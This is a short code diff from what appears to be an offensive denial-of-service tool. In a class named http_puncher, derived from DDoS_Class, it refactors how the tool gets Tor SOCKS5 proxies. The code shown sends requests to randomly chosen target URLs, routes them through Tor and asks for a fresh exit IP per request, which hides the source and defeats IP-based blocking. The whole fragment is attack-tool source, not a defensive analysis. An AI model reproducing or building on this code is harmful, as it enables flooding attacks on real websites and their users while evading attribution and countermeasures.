@@ -35,7 +35,7 @@ class http_puncher(DDoS_Class):
         self.tor = tor
         if scrape_target==True:
             if tor==True:
-                proxy=get_tor_socks5_proxy()
+                proxy=Proxies_Getter.get_tor_socks5_proxy()
             else:
                 proxy=None
             if logs==True:
@@ -105,7 +105,7 @@ class http_puncher(DDoS_Class):
                     headers = {key: headers[key] for key in header_keys}
                     req_session.headers=OrderedDict(list(headers.items()))
                     if self.tor==True:
-                        proxy=get_tor_socks5_proxy(new_ip=True)
+                        proxy=Proxies_Getter.get_tor_socks5_proxy(new_ip=True)
                     else:
                         proxy=None
                     url=random.choice(self.urls)
